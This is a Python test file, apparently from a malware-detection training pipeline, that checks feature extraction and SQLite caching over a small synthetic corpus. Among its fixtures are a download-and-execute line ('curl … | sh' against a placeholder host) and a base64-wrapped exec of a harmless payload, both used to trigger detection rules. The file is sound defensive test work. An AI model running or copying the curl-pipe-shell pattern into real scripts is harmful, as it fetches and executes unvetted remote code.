"""Extracao para o cache SQLite: corpus sintetico inofensivo."""
import numpy as np
import pytest

pytest.importorskip("pyzipper")
pytest.importorskip("numpy")
from mandacaru.ml.features import ELF_FEATURE_NAMES, SCRIPT_FEATURE_NAMES, extract
from tools.treino.extrair import carregar, extrair, extrair_cache, salvar


def test_extrai_por_familia_com_extensao_sintetica_e_cache(tmp_path):
    c, d, dados, sha_curl, sha_heur = _corpus_e_divisao(tmp_path)
    db = tmp_path / "cache.sqlite"
    r1 = extrair_cache(c, db)
    assert r1["extraidos"] == 4 and r1["cacheados"] == 0
    r2 = extrair_cache(c, db)
    assert r2["extraidos"] == 0 and r2["cacheados"] == 4         # incremental
    t = extrair(c, d, cache_db=db)
    assert set(t) == {"elf", "script"}
    assert t["script"].X.dtype == np.float32
    assert t["script"].X.shape[1] == len(SCRIPT_FEATURE_NAMES)
    assert t["elf"].X.shape[1] == len(ELF_FEATURE_NAMES)
    i = t["script"].sha.index(sha_curl)
    assert bool(t["script"].regra_media[i]) is True and bool(t["script"].regra_alta[i]) is False
    j = t["script"].sha.index(sha_heur)
    assert bool(t["script"].regra_media[j]) is True             # heur.obfuscated_script disparou pela extensao .py
    assert np.allclose(t["script"].X[i], np.asarray(extract("sh", dados[sha_curl]), dtype=np.float32))


def test_salvar_e_carregar_npz(tmp_path):
    c, d, *_ = _corpus_e_divisao(tmp_path)
    t = extrair(c, d)
    salvar(t, tmp_path / "tab")
    assert (tmp_path / "tab" / "script.npz").is_file()
    assert carregar(tmp_path / "tab")["script"].sha == t["script"].sha


def _corpus_e_divisao(tmp_path):
    """3 scripts inofensivos + 1 ELF montado a mao, todos no treino."""
    import base64
    import hashlib

    from ml_elf import make_elf

    from tools.treino.corpus import Corpus, Entry
    from tools.treino.higiene import Divisao

    payload = base64.b64encode(b"print('inofensivo')\n" * 40).decode()
    dados_lista = [
        b"#!/bin/sh\ncurl -s http://exemplo.invalid/x | sh\n",
        f"import base64\nexec(base64.b64decode('{payload}'))\n".encode(),
        b"#!/bin/sh\necho ola\n",
        make_elf(sections=[(".text", 1, 0x6, 0x401000, b"\x90" * 64)]),
    ]
    c = Corpus(tmp_path / "corpus")
    dados = {}
    for i, data in enumerate(dados_lista):
        sha = hashlib.sha256(data).hexdigest()
        dados[sha] = data
        assert c.add_bytes(Entry(sha, i % 2, "teste", "Fam", "2026-01-01", "r", "geral"), data)
    shas = list(dados)
    d = Divisao(treino=tuple(shas), calibracao=(), teste=(), familias_teste=(), corte_temporal_teste=())
    return c, d, dados, shas[0], shas[1]
